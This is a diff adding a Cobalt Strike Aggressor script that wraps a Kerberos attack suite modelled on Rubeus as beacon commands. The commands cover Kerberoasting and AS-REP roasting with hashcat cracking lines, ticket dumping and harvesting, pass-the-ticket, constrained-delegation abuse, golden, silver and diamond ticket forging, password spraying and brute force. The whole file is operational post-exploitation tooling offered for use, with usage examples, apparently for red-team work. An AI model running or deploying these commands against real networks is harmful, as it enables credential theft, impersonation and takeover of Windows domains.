@@ -1,0 +1,568 @@
+#
+# Kerbeus BOF Suite - Aggressor Script
+# Comprehensive Kerberos attack toolkit for Cobalt Strike
+# Based on Rubeus functionality
+#
+
+# ============================================================================
+# Helper function to execute BOF
+# ============================================================================
+
+sub kerbeus_exec {
+    local('$bid $bof_name $args $barch $handle $data $packed');
+    $bid = $1;
+    $bof_name = $2;
+    $args = $3;
+
+    $barch = barch($bid);
+    $handle = openf(script_resource("bin/" . $bof_name . "." . $barch . ".o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    if (strlen($data) == 0) {
+        berror($bid, "Failed to load BOF: " . $bof_name . "." . $barch . ".o");
+        return;
+    }
+
+    $packed = bof_pack($bid, "z", $args);
+    beacon_inline_execute($bid, $data, "go", $packed);
+}
+
+# ============================================================================
+# TICKET REQUESTS
+# ============================================================================
+
+# krb_asktgt - Request a TGT
+beacon_command_register(
+    "krb_asktgt",
+    "Request a Kerberos TGT",
+
+    "Request a Ticket Granting Ticket (TGT) using credentials.\n\n" .
+    "Usage:\n" .
+    "   krb_asktgt /user:USER /password:PASS [/domain:DOMAIN] [/dc:DC] [/enctype:rc4|aes256] [/ptt] [/nopac] [/opsec]\n" .
+    "   krb_asktgt /user:USER /rc4:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac]\n" .
+    "   krb_asktgt /user:USER /aes256:HASH [/domain:DOMAIN] [/dc:DC] [/ptt] [/nopac] [/opsec]\n" .
+    "   krb_asktgt /user:USER /nopreauth [/domain:DOMAIN] [/dc:DC]\n"
+);
+
+alias krb_asktgt {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 11);
+    btask($bid, "Kerbeus: Requesting TGT");
+    kerbeus_exec($bid, "krb_asktgt", $args);
+}
+
+# krb_asktgs - Request a Service Ticket
+beacon_command_register(
+    "krb_asktgs",
+    "Request a Kerberos service ticket (TGS)",
+
+    "Request a Service Ticket using a TGT.\n\n" .
+    "Usage:\n" .
+    "   krb_asktgs /service:SPN [/ticket:BASE64] [/domain:DOMAIN] [/dc:DC] [/ptt]\n" .
+    "   krb_asktgs /service:SPN1,SPN2 /ticket:BASE64 [/enctype:rc4|aes256]\n" .
+    "   krb_asktgs /service:SPN /ticket:BASE64 /u2u [/tgs:BASE64]\n"
+);
+
+alias krb_asktgs {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 11);
+    btask($bid, "Kerbeus: Requesting TGS");
+    kerbeus_exec($bid, "krb_asktgs", $args);
+}
+
+# krb_renew - Renew TGT
+beacon_command_register(
+    "krb_renew",
+    "Renew an existing TGT",
+
+    "Renew a renewable TGT to extend its lifetime.\n\n" .
+    "Usage:\n" .
+    "   krb_renew /ticket:BASE64 [/dc:DC] [/ptt]\n"
+);
+
+alias krb_renew {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 10);
+    btask($bid, "Kerbeus: Renewing TGT");
+    kerbeus_exec($bid, "krb_renew", $args);
+}
+
+# ============================================================================
+# ROASTING ATTACKS
+# ============================================================================
+
+# krb_kerberoasting - Kerberoast
+beacon_command_register(
+    "krb_kerberoasting",
+    "Kerberoast - Request service tickets for offline password cracking",
+
+    "Request service tickets for SPNs to crack offline.\n\n" .
+    "Usage:\n" .
+    "   krb_kerberoasting /spn:SPN [/dc:DC] [/domain:DOMAIN]\n" .
+    "   krb_kerberoasting /spn:SPN1,SPN2,SPN3 [/dc:DC]\n" .
+    "   krb_kerberoasting /spn:SPN /ticket:BASE64\n\n" .
+    "Crack with: hashcat -m 13100 hashes.txt wordlist.txt\n"
+);
+
+alias krb_kerberoasting {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 18);
+    btask($bid, "Kerbeus: Kerberoasting");
+    kerbeus_exec($bid, "krb_kerberoasting", $args);
+}
+
+# krb_asreproasting - AS-REP Roasting
+beacon_command_register(
+    "krb_asreproasting",
+    "AS-REP Roast - Find accounts without pre-authentication",
+
+    "Request AS-REP for users without Kerberos pre-authentication.\n\n" .
+    "Usage:\n" .
+    "   krb_asreproasting /user:USER /dc:DC [/domain:DOMAIN]\n\n" .
+    "Crack with: hashcat -m 18200 hashes.txt wordlist.txt\n"
+);
+
+alias krb_asreproasting {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 19);
+    btask($bid, "Kerbeus: AS-REP Roasting");
+    kerbeus_exec($bid, "krb_asreproasting", $args);
+}
+
+# ============================================================================
+# TICKET MANAGEMENT
+# ============================================================================
+
+# krb_klist - List cached tickets
+beacon_command_register(
+    "krb_klist",
+    "List Kerberos tickets in current logon session",
+
+    "Display cached Kerberos tickets.\n\n" .
+    "Usage:\n" .
+    "   krb_klist [/luid:LOGONID] [/user:USER] [/service:SERVICE]\n"
+);
+
+alias krb_klist {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 10);
+    btask($bid, "Kerbeus: Listing tickets");
+    kerbeus_exec($bid, "krb_klist", $args);
+}
+
+# krb_ptt - Pass The Ticket
+beacon_command_register(
+    "krb_ptt",
+    "Pass The Ticket - Submit a ticket to the logon session",
+
+    "Import a Kerberos ticket into the current logon session.\n\n" .
+    "Usage:\n" .
+    "   krb_ptt /ticket:BASE64 [/luid:LOGONID]\n"
+);
+
+alias krb_ptt {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 8);
+    btask($bid, "Kerbeus: Pass The Ticket");
+    kerbeus_exec($bid, "krb_ptt", $args);
+}
+
+# krb_purge - Purge tickets
+beacon_command_register(
+    "krb_purge",
+    "Purge all Kerberos tickets from logon session",
+
+    "Remove all cached Kerberos tickets.\n\n" .
+    "Usage:\n" .
+    "   krb_purge [/luid:LOGONID]\n"
+);
+
+alias krb_purge {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 10);
+    btask($bid, "Kerbeus: Purging tickets");
+    kerbeus_exec($bid, "krb_purge", $args);
+}
+
+# krb_describe - Describe a ticket
+beacon_command_register(
+    "krb_describe",
+    "Parse and display ticket information",
+
+    "Decode and display contents of a Kerberos ticket.\n\n" .
+    "Usage:\n" .
+    "   krb_describe /ticket:BASE64\n"
+);
+
+alias krb_describe {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 13);
+    btask($bid, "Kerbeus: Describing ticket");
+    kerbeus_exec($bid, "krb_describe", $args);
+}
+
+# ============================================================================
+# TICKET EXTRACTION
+# ============================================================================
+
+# krb_dump - Dump tickets
+beacon_command_register(
+    "krb_dump",
+    "Extract Kerberos tickets from logon sessions",
+
+    "Dump TGTs and service tickets (requires elevation for other sessions).\n\n" .
+    "Usage:\n" .
+    "   krb_dump [/luid:LOGONID] [/service:SERVICE]\n"
+);
+
+alias krb_dump {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 9);
+    btask($bid, "Kerbeus: Dumping tickets");
+    kerbeus_exec($bid, "krb_dump", $args);
+}
+
+# krb_triage - Triage tickets
+beacon_command_register(
+    "krb_triage",
+    "Display summary table of Kerberos tickets",
+
+    "Show tickets in table format.\n\n" .
+    "Usage:\n" .
+    "   krb_triage [/luid:LOGONID]\n"
+);
+
+alias krb_triage {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 11);
+    btask($bid, "Kerbeus: Triaging tickets");
+    kerbeus_exec($bid, "krb_triage", $args);
+}
+
+# krb_tgtdeleg - TGT Delegation Trick
+beacon_command_register(
+    "krb_tgtdeleg",
+    "Retrieve TGT via Kerberos delegation trick",
+
+    "Obtain a usable TGT without elevation using GSS-API delegation.\n\n" .
+    "Usage:\n" .
+    "   krb_tgtdeleg [/target:SPN]\n"
+);
+
+alias krb_tgtdeleg {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 13);
+    btask($bid, "Kerbeus: TGT Delegation");
+    kerbeus_exec($bid, "krb_tgtdeleg", $args);
+}
+
+# krb_harvest - Harvest TGTs
+beacon_command_register(
+    "krb_harvest",
+    "Harvest TGTs from all logon sessions",
+
+    "Extract and display all TGTs with optional auto-renew.\n\n" .
+    "Usage:\n" .
+    "   krb_harvest [/interval:SECONDS] [/nowrap]\n\n" .
+    "   /interval - Continuous mode with refresh interval\n" .
+    "   /nowrap   - Don't output base64 tickets\n"
+);
+
+alias krb_harvest {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 12);
+    btask($bid, "Kerbeus: Harvesting TGTs");
+    kerbeus_exec($bid, "krb_harvest", $args);
+}
+
+# krb_monitor - Monitor for new TGTs
+beacon_command_register(
+    "krb_monitor",
+    "Monitor for new TGT acquisitions",
+
+    "Continuously watch for new TGTs appearing in logon sessions.\n\n" .
+    "Usage:\n" .
+    "   krb_monitor [/interval:SECONDS] [/targetuser:USER] [/count:N]\n\n" .
+    "   /interval   - Check interval in seconds (default: 60)\n" .
+    "   /targetuser - Filter for specific user\n" .
+    "   /count      - Number of iterations (default: 10)\n"
+);
+
+alias krb_monitor {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 12);
+    btask($bid, "Kerbeus: Monitoring for TGTs");
+    kerbeus_exec($bid, "krb_monitor", $args);
+}
+
+# ============================================================================
+# DELEGATION ABUSE
+# ============================================================================
+
+# krb_s4u - S4U Delegation Abuse
+beacon_command_register(
+    "krb_s4u",
+    "S4U2Self/S4U2Proxy constrained delegation abuse",
+
+    "Exploit constrained delegation to impersonate users.\n\n" .
+    "Usage:\n" .
+    "   krb_s4u /ticket:BASE64 /service:SPN /impersonateuser:USER [/domain:DOMAIN] [/dc:DC] [/ptt] [/self]\n" .
+    "   krb_s4u /ticket:BASE64 /service:SPN /tgs:BASE64 [/altservice:SVC] [/ptt]\n"
+);
+
+alias krb_s4u {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 8);
+    btask($bid, "Kerbeus: S4U Delegation");
+    kerbeus_exec($bid, "krb_s4u", $args);
+}
+
+# ============================================================================
+# TICKET FORGING
+# ============================================================================
+
+# krb_golden - Golden Ticket
+beacon_command_register(
+    "krb_golden",
+    "Forge a Golden Ticket (TGT)",
+
+    "Create a forged TGT using the KRBTGT hash.\n\n" .
+    "Usage:\n" .
+    "   krb_golden /user:USER /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:HASH [/id:RID] [/groups:512,513] [/ptt]\n" .
+    "   krb_golden /user:USER /domain:DOMAIN /sid:SID /aes256:HASH [/id:RID] [/ptt]\n\n" .
+    "Example:\n" .
+    "   krb_golden /user:Administrator /domain:CORP.LOCAL /sid:S-1-5-21-123-456-789 /krbtgt:aad3b435...\n"
+);
+
+alias krb_golden {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 11);
+    btask($bid, "Kerbeus: Forging Golden Ticket");
+    kerbeus_exec($bid, "krb_golden", $args);
+}
+
+# krb_silver - Silver Ticket
+beacon_command_register(
+    "krb_silver",
+    "Forge a Silver Ticket (TGS)",
+
+    "Create a forged service ticket using the service account hash.\n\n" .
+    "Usage:\n" .
+    "   krb_silver /user:USER /domain:DOMAIN /sid:SID /service:SPN /rc4:HASH [/id:RID] [/ptt]\n" .
+    "   krb_silver /user:USER /domain:DOMAIN /sid:SID /service:SPN /aes256:HASH [/id:RID] [/ptt]\n\n" .
+    "Example:\n" .
+    "   krb_silver /user:Administrator /domain:CORP.LOCAL /sid:S-1-5-21-... /service:cifs/dc01.corp.local /rc4:...\n"
+);
+
+alias krb_silver {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 11);
+    btask($bid, "Kerbeus: Forging Silver Ticket");
+    kerbeus_exec($bid, "krb_silver", $args);
+}
+
+# krb_diamond - Diamond Ticket
+beacon_command_register(
+    "krb_diamond",
+    "Forge a Diamond Ticket (modified TGT)",
+
+    "Create a modified TGT by decrypting and re-encrypting with custom PAC.\n\n" .
+    "Usage:\n" .
+    "   krb_diamond /ticket:BASE64 /krbkey:HASH [/targetuser:USER] [/groups:512,513] [/ptt]\n" .
+    "   krb_diamond /user:USER /password:PASS /krbkey:HASH [/domain:DOMAIN] [/dc:DC]\n\n" .
+    "Diamond tickets are stealthier than golden tickets as they start from legitimate TGTs.\n"
+);
+
+alias krb_diamond {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 12);
+    btask($bid, "Kerbeus: Forging Diamond Ticket");
+    kerbeus_exec($bid, "krb_diamond", $args);
+}
+
+# ============================================================================
+# UTILITIES
+# ============================================================================
+
+# krb_hash - Calculate Kerberos hashes
+beacon_command_register(
+    "krb_hash",
+    "Calculate Kerberos encryption keys from password",
+
+    "Generate RC4-HMAC (NTLM), AES128, and AES256 hashes.\n\n" .
+    "Usage:\n" .
+    "   krb_hash /password:PASSWORD [/user:USER] [/domain:DOMAIN]\n"
+);
+
+alias krb_hash {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 9);
+    btask($bid, "Kerbeus: Calculating hashes");
+    kerbeus_exec($bid, "krb_hash", $args);
+}
+
+# krb_changepw - Change password
+beacon_command_register(
+    "krb_changepw",
+    "Change user password via Kerberos",
+
+    "Change password using Kerberos kpasswd protocol.\n\n" .
+    "Usage:\n" .
+    "   krb_changepw /ticket:BASE64 /new:PASSWORD [/dc:DC]\n" .
+    "   krb_changepw /ticket:BASE64 /new:PASSWORD /targetuser:USER /targetdomain:DOMAIN\n"
+);
+
+alias krb_changepw {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 13);
+    btask($bid, "Kerbeus: Changing password");
+    kerbeus_exec($bid, "krb_changepw", $args);
+}
+
+# krb_currentluid - Get current LUID
+beacon_command_register(
+    "krb_currentluid",
+    "Display current logon session LUID",
+
+    "Show the current user's Logon User ID (LUID).\n\n" .
+    "Usage:\n" .
+    "   krb_currentluid\n"
+);
+
+alias krb_currentluid {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 16);
+    btask($bid, "Kerbeus: Getting current LUID");
+    kerbeus_exec($bid, "krb_currentluid", $args);
+}
+
+# krb_logonsession - Enumerate logon sessions
+beacon_command_register(
+    "krb_logonsession",
+    "Enumerate logon sessions",
+
+    "Display detailed information about logon sessions.\n\n" .
+    "Usage:\n" .
+    "   krb_logonsession [/current] [/luid:LUID]\n\n" .
+    "   /current - Show only current session\n" .
+    "   /luid    - Show specific session by LUID\n"
+);
+
+alias krb_logonsession {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 17);
+    btask($bid, "Kerbeus: Enumerating logon sessions");
+    kerbeus_exec($bid, "krb_logonsession", $args);
+}
+
+# krb_createnetonly - Create process with network creds
+beacon_command_register(
+    "krb_createnetonly",
+    "Create process with LOGON_NETCREDENTIALS_ONLY",
+
+    "Spawn a new process with a sacrificial logon session for ticket injection.\n\n" .
+    "Usage:\n" .
+    "   krb_createnetonly /program:PATH [/show] [/ticket:BASE64]\n\n" .
+    "   /program - Path to program to execute\n" .
+    "   /show    - Show the window (default: hidden)\n" .
+    "   /ticket  - Ticket to inject after creation\n"
+);
+
+alias krb_createnetonly {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 18);
+    btask($bid, "Kerbeus: Creating netonly process");
+    kerbeus_exec($bid, "krb_createnetonly", $args);
+}
+
+# krb_brute - Kerberos brute force
+beacon_command_register(
+    "krb_brute",
+    "Kerberos password brute-force/spray",
+
+    "Perform Kerberos-based password attacks.\n\n" .
+    "Usage:\n" .
+    "   krb_brute /users:FILE /password:PASS [/domain:DOMAIN] [/dc:DC] [/delay:MS]\n" .
+    "   krb_brute /user:USER /passwords:FILE [/domain:DOMAIN] [/dc:DC]\n" .
+    "   krb_brute /user:USER /password:PASS [/domain:DOMAIN]\n\n" .
+    "Password spray - try one password against many users\n" .
+    "Brute force - try many passwords against one user\n"
+);
+
+alias krb_brute {
+    local('$bid $args');
+    $bid = $1;
+    $args = substr($0, 10);
+    btask($bid, "Kerbeus: Password brute-force");
+    kerbeus_exec($bid, "krb_brute", $args);
+}
+
+# ============================================================================
+# Initialization
+# ============================================================================
+
+println("[*] Kerbeus BOF Suite loaded - Full Rubeus Feature Set");
+println("[*] Available commands:");
+println("");
+println("    === Ticket Requests ===");
+println("    krb_asktgt        - Request TGT");
+println("    krb_asktgs        - Request service ticket");
+println("    krb_renew         - Renew TGT");
+println("");
+println("    === Roasting Attacks ===");
+println("    krb_kerberoasting - Kerberoast SPNs");
+println("    krb_asreproasting - AS-REP roast users");
+println("");
+println("    === Ticket Management ===");
+println("    krb_klist         - List tickets");
+println("    krb_ptt           - Pass the ticket");
+println("    krb_purge         - Purge tickets");
+println("    krb_describe      - Describe ticket");
+println("");
+println("    === Ticket Extraction ===");
+println("    krb_dump          - Dump tickets");
+println("    krb_triage        - Triage tickets");
+println("    krb_tgtdeleg      - TGT delegation trick");
+println("    krb_harvest       - Harvest TGTs");
+println("    krb_monitor       - Monitor for TGTs");
+println("");
+println("    === Delegation Abuse ===");
+println("    krb_s4u           - S4U delegation abuse");
+println("");
+println("    === Ticket Forging ===");
+println("    krb_golden        - Forge golden ticket");
+println("    krb_silver        - Forge silver ticket");
+println("    krb_diamond       - Forge diamond ticket");
+println("");
+println("    === Utilities ===");
+println("    krb_hash          - Calculate hashes");
+println("    krb_changepw      - Change password");
+println("    krb_currentluid   - Get current LUID");
+println("    krb_logonsession  - Enumerate sessions");
+println("    krb_createnetonly - Create netonly process");
+println("    krb_brute         - Password spray/brute");
+println("");
